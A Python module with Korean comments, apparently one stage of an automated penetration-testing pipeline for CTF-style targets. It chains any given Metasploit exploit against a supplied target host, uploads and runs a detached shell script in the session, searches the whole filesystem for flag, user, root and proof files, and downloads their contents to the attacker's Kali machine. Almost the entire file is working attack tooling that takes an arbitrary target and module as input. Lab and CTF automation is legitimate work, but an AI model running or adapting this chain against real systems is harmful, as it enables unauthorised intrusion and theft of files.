"""
6단계: Flag Capture. DESIGN.md 3절.

exploitation.py가 확보한 Metasploit 세션에서 흔한 CTF flag 파일명을 찾아
내용을 읽어 state_store에 기록한다. post_exploit.py에서 실전 검증하며 잡은
버그들(msfconsole -x 스크립팅의 따옴표 중첩 문제, sessions -c/-C 구분, 세션
종료 시 자식 프로세스 정리 문제)을 처음부터 반영해서 설계한다 - DESIGN.md 21절.

exploit + flag 탐색을 같은 msfconsole 스크립트 안에서 체이닝한다(세션이
스크립트 종료 시 끊기므로 별도 재연결 불가 - exploitation.py 18절과 동일한
제약).

알려진 한계: 정확한 파일명 목록만 찾는다(와일드카드 안 씀 - msfconsole -x
스크립팅에서 따옴표로 감싼 와일드카드를 안전하게 다루려면 post_exploit.py
21절에서 겪은 것과 같은 따옴표 중첩 위험이 있어서 피함). "flag*.txt"처럼
변형된 이름은 못 찾을 수 있음 - 필요해지면 FLAG_FILENAMES를 늘리거나,
post_exploit.py의 heredoc 래퍼 스크립트 패턴처럼 더 정교한 검색으로 확장.
"""

import time

from core import config  # noqa: F401 - import 시점에 .env를 로드함 + stdout UTF-8 고정
from core.state_store import append_finding
from env.guest_control import run_in_kali
from env.job_runner import start_job, wait_for_job

FLAG_FILENAMES = ["flag.txt", "flag1.txt", "flag2.txt", "user.txt", "root.txt", "proof.txt", "local.txt"]

_WRAPPER_PATH = "/tmp/find_flags.sh"
_REMOTE_OUT = "/tmp/flags_out.txt"
_MARKER = "===FLAG_FILE:"


def search_and_capture_flags(engagement_id: str, target: str, module: str, port: int, kali_ip: str) -> list[dict]:
    """익스플로잇 실행 + flag 파일 탐색/읽기를 같은 msfconsole 세션 안에서
    체이닝하고, 결과를 파일로 받아온다(post_exploit.py와 동일 패턴 - 21절)."""
    local_out = f"/tmp/flags_out_{target}_{port}_{int(time.time())}.txt"

    name_clauses = " -o ".join(f"-iname {name}" for name in FLAG_FILENAMES)
    # 래퍼 스크립트를 Kali에 미리 써둠(heredoc이라 따옴표 중첩 걱정 없음).
    # nohup+disown으로 세션 프로세스 그룹에서 떼어내서, msfconsole 스크립트가
    # 먼저 끝나도(exit -y) find/cat이 안 죽고 계속 돌게 한다(post_exploit.py
    # 21절에서 실측으로 확인한 문제를 처음부터 반영).
    wrapper_body = (
        "nohup bash -c '"
        f"find / -xdev {name_clauses} 2>/dev/null | "
        f'while read -r f; do echo "{_MARKER} $f"; cat "$f" 2>/dev/null; echo; done'
        f" > {_REMOTE_OUT}"
        "' < /dev/null > /dev/null 2>&1 &\n"
        "disown -a\n"
    )
    write = run_in_kali(f"cat > {_WRAPPER_PATH} << 'WRAPEOF'\n{wrapper_body}WRAPEOF", timeout=20)
    if not write.ok:
        raise RuntimeError(f"flag 탐색 래퍼 스크립트를 kali에 쓰는 데 실패: {write.stderr}")

    # download 목적지는 이 Metasploit 버전에서 항상 디렉터리로 취급된다
    # (post_exploit.py 21절에서 실측) - 미리 디렉터리로 만들어두고 그 안의
    # 원격 파일명 그대로 읽는다.
    mkdir = run_in_kali(f"mkdir -p {local_out}", timeout=15)
    if not mkdir.ok:
        raise RuntimeError(f"로컬 출력 디렉터리 준비 실패: {mkdir.stderr}")
    downloaded_path = f"{local_out}/{_REMOTE_OUT.rsplit('/', 1)[-1]}"

    script = (
        f"use {module}; set RHOSTS {target}; set RPORT {port}; set LHOST {kali_ip}; "
        "exploit -j -z; sleep 10; "
        f"sessions -C 'upload {_WRAPPER_PATH} {_WRAPPER_PATH}' -i 1; sleep 2; "
        f"sessions -C 'execute -f /bin/bash -a {_WRAPPER_PATH} -H' -i 1; sleep 20; "
        f"sessions -C 'download {_REMOTE_OUT} {local_out}' -i 1; sleep 2; "
        "sessions -l; exit -y"
    )
    job_id = f"flagcapture-{target}-{port}-{int(time.time())}"
    handle = start_job(engagement_id, job_id, f'msfconsole -q -x "{script}"')
    wait_for_job(engagement_id, handle, hard_timeout=120)

    downloaded = run_in_kali(f"cat {downloaded_path} 2>/dev/null", timeout=20)
    if not downloaded.ok or not downloaded.stdout.strip():
        append_finding(engagement_id, stage="flag_capture", event="no_flags_found", target=target)
        return []

    flags = _parse_flags(downloaded.stdout)
    for f in flags:
        append_finding(
            engagement_id, stage="flag_capture", event="flag_found", target=target,
            path=f["path"], content=f["content"],
        )
    if not flags:
        append_finding(engagement_id, stage="flag_capture", event="no_flags_found", target=target)
    return flags


def _parse_flags(raw: str) -> list[dict]:
    """`===FLAG_FILE: <path>` 마커로 구분된 파일 경로/내용 쌍을 잘라낸다."""
    flags: list[dict] = []
    current_path: str | None = None
    current_lines: list[str] = []

    def _flush():
        if current_path is not None:
            flags.append({"path": current_path, "content": "\n".join(current_lines).strip()})

    for line in raw.splitlines():
        if line.startswith(_MARKER):
            _flush()
            current_path = line[len(_MARKER):].strip()
            current_lines = []
        elif current_path is not None:
            current_lines.append(line)
    _flush()
    return flags


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 6:
        print("usage: python -m modules.flag_capture <engagement_id> <target> <msf_module> <port> <kali_ip>")
        sys.exit(1)

    eid, tgt, mod, prt, kip = sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]), sys.argv[5]
    found = search_and_capture_flags(eid, tgt, mod, prt, kip)
    if not found:
        print("flag 못 찾음")
    for f in found:
        print(f"--- {f['path']} ---")
        print(f["content"])
